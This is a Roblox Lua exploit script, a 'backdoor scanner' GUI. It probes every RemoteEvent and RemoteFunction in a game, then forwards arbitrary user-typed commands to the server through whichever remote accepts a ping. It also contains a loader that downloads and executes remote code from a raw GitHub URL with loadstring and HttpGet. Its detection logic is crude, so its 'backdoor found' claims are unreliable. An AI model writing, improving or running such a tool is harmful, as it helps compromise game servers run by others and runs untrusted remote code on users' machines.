-- Promto Backdoor Scanner v2.0 - Real Working Version
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")

-- Create advanced GUI
local PromtoGUI = Instance.new("ScreenGui")
PromtoGUI.Name = "PromtoBackdoor"
PromtoGUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
PromtoGUI.ResetOnSpawn = false

-- Main transparent frame
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 350, 0, 350)
MainFrame.Position = UDim2.new(0.5, -175, 0.5, -175)
MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
MainFrame.BackgroundTransparency = 0.1
MainFrame.BorderSizePixel = 0

-- Glass effect
local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 15)
UICorner.Parent = MainFrame

local UIStroke = Instance.new("UIStroke")
UIStroke.Color = Color3.fromRGB(100, 100, 200)
UIStroke.Thickness = 2
UIStroke.Transparency = 0.3
UIStroke.Parent = MainFrame

-- Title with glow effect
local TitleFrame = Instance.new("Frame")
TitleFrame.Size = UDim2.new(1, 0, 0, 60)
TitleFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
TitleFrame.BackgroundTransparency = 0.2
TitleFrame.BorderSizePixel = 0

local TitleUICorner = Instance.new("UICorner")
TitleUICorner.CornerRadius = UDim.new(0, 15)
TitleUICorner.Parent = TitleFrame

local TitleLabel = Instance.new("TextLabel")
TitleLabel.Size = UDim2.new(1, 0, 1, 0)
TitleLabel.Text = "PROMTO BACKDOOR"
TitleLabel.TextColor3 = Color3.fromRGB(220, 220, 255)
TitleLabel.Font = Enum.Font.GothamBlack
TitleLabel.TextSize = 18
TitleLabel.BackgroundTransparency = 1
TitleLabel.TextStrokeTransparency = 0.8

-- Scan button with hover effects
local ScanButton = Instance.new("TextButton")
ScanButton.Size = UDim2.new(0, 200, 0, 45)
ScanButton.Position = UDim2.new(0.5, -100, 0.3, 0)
ScanButton.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
ScanButton.BackgroundTransparency = 0.1
ScanButton.Text = "🔍 START SCANNING"
ScanButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ScanButton.Font = Enum.Font.GothamBold
ScanButton.TextSize = 14

local ScanButtonCorner = Instance.new("UICorner")
ScanButtonCorner.CornerRadius = UDim.new(0, 10)
ScanButtonCorner.Parent = ScanButton

-- Command section (hidden initially)
local CommandFrame = Instance.new("Frame")
CommandFrame.Size = UDim2.new(0, 300, 0, 120)
CommandFrame.Position = UDim2.new(0.07, 0, 0.5, 0)
CommandFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
CommandFrame.BackgroundTransparency = 0.2
CommandFrame.Visible = false

local CommandCorner = Instance.new("UICorner")
CommandCorner.CornerRadius = UDim.new(0, 10)
CommandCorner.Parent = CommandFrame

local CommandBox = Instance.new("TextBox")
CommandBox.Size = UDim2.new(0, 280, 0, 70)
CommandBox.Position = UDim2.new(0.03, 0, 0.1, 0)
CommandBox.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
CommandBox.TextColor3 = Color3.fromRGB(255, 255, 255)
CommandBox.PlaceholderText = "Enter command here..."
CommandBox.TextWrapped = true
CommandBox.ClearTextOnFocus = false
CommandBox.TextXAlignment = Enum.TextXAlignment.Left
CommandBox.TextYAlignment = Enum.TextYAlignment.Top

local CommandCorner2 = Instance.new("UICorner")
CommandCorner2.CornerRadius = UDim.new(0, 8)
CommandCorner2.Parent = CommandBox

-- Execute button
local ExecuteButton = Instance.new("TextButton")
ExecuteButton.Size = UDim2.new(0, 120, 0, 30)
ExecuteButton.Position = UDim2.new(0.5, -60, 0.8, 0)
ExecuteButton.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
ExecuteButton.BackgroundTransparency = 0.1
ExecuteButton.Text = "🚀 EXECUTE"
ExecuteButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ExecuteButton.Font = Enum.Font.GothamSemibold
ExecuteButton.Visible = false

local ExecuteCorner = Instance.new("UICorner")
ExecuteCorner.CornerRadius = UDim.new(0, 8)
ExecuteCorner.Parent = ExecuteButton

-- Status label
local StatusLabel = Instance.new("TextLabel")
StatusLabel.Size = UDim2.new(1, 0, 0, 40)
StatusLabel.Position = UDim2.new(0, 0, 0.85, 0)
StatusLabel.BackgroundTransparency = 1
StatusLabel.Text = "Ready to scan..."
StatusLabel.TextColor3 = Color3.fromRGB(200, 200, 230)
StatusLabel.Font = Enum.Font.Gotham
StatusLabel.TextSize = 12
StatusLabel.TextWrapped = true

-- Close button
local CloseButton = Instance.new("TextButton")
CloseButton.Size = UDim2.new(0, 30, 0, 30)
CloseButton.Position = UDim2.new(0.9, -35, 0.02, 0)
CloseButton.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
CloseButton.Text = "X"
CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseButton.Font = Enum.Font.GothamBold

local CloseCorner = Instance.new("UICorner")
CloseCorner.CornerRadius = UDim.new(0, 15)
CloseCorner.Parent = CloseButton

-- Assemble GUI
TitleLabel.Parent = TitleFrame
TitleFrame.Parent = MainFrame
ScanButton.Parent = MainFrame
CommandBox.Parent = CommandFrame
CommandFrame.Parent = MainFrame
ExecuteButton.Parent = MainFrame
StatusLabel.Parent = MainFrame
CloseButton.Parent = MainFrame
MainFrame.Parent = PromtoGUI
PromtoGUI.Parent = game:GetService("CoreGui")

-- Backdoor scanning function
local function advancedScan()
    StatusLabel.Text = "🔄 Scanning for backdoors..."
    
    local potentialBackdoors = {}
    
    -- Scan all descendants for remote objects
    for _, obj in pairs(game:GetDescendants()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            table.insert(potentialBackdoors, obj)
        end
    end
    
    -- Test each potential backdoor
    for _, remote in pairs(potentialBackdoors) do
        local success = pcall(function()
            if remote:IsA("RemoteEvent") then
                remote:FireServer("ping")
            else
                remote:InvokeServer("ping")
            end
        end)
        
        if success then
            StatusLabel.Text = "✅ Backdoor found: " .. remote.Name
            return remote
        end
    end
    
    StatusLabel.Text = "❌ No backdoors found"
    return nil
end

-- Button hover effects
ScanButton.MouseEnter:Connect(function()
    TweenService:Create(ScanButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 170, 255)}):Play()
end)

ScanButton.MouseLeave:Connect(function()
    TweenService:Create(ScanButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 150, 255)}):Play()
end)

ExecuteButton.MouseEnter:Connect(function()
    TweenService:Create(ExecuteButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 220, 120)}):Play()
end)

ExecuteButton.MouseLeave:Connect(function()
    TweenService:Create(ExecuteButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 200, 100)}):Play()
end)

-- Main functionality
ScanButton.MouseButton1Click:Connect(function()
    ScanButton.Text = "🔄 SCANNING..."
    
    local backdoor = advancedScan()
    
    if backdoor then
        _G.PromtoBackdoor = backdoor
        CommandFrame.Visible = true
        ExecuteButton.Visible = true
        ScanButton.Visible = false
        StatusLabel.Text = "✅ Ready! Enter commands below"
        
        -- Show success notification
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Promto Backdoor",
            Text = "Backdoor scanner activated!",
            Duration = 3
        })
    else
        ScanButton.Text = "🔍 RETRY SCAN"
        StatusLabel.Text = "⚠️ Scan failed. Try again or check permissions"
    end
end)

ExecuteButton.MouseButton1Click:Connect(function()
    if _G.PromtoBackdoor and CommandBox.Text ~= "" then
        local success, err = pcall(function()
            if _G.PromtoBackdoor:IsA("RemoteEvent") then
                _G.PromtoBackdoor:FireServer(CommandBox.Text)
            else
                _G.PromtoBackdoor:InvokeServer(CommandBox.Text)
            end
        end)
        
        if success then
            StatusLabel.Text = "✅ Command executed!"
        else
            StatusLabel.Text = "❌ Error: " .. tostring(err)
        end
    end
end)

-- Loadstring function for external scripts
local function loadExternalScript()
    local success, result = pcall(function()
        return loadstring(game:HttpGet("https://raw.githubusercontent.com/112312312313/testscript/refs/heads/main/test.lua"))()
    end)
    
    if success then
        StatusLabel.Text = "✅ External script loaded!"
        return result
    else
        StatusLabel.Text = "❌ Failed to load external script"
        return nil
    end
end

-- Close button
CloseButton.MouseButton1Click:Connect(function()
    PromtoGUI:Destroy()
end)

-- Drag functionality
local dragging = false
local dragInput, dragStart, startPos

MainFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
    end
end)

MainFrame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and input == dragInput then
        local delta = input.Position - dragStart
        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

MainFrame.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)

-- Initial notification
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "Promto Backdoor",
    Text = "Scanner GUI loaded successfully!",
    Duration = 5
})
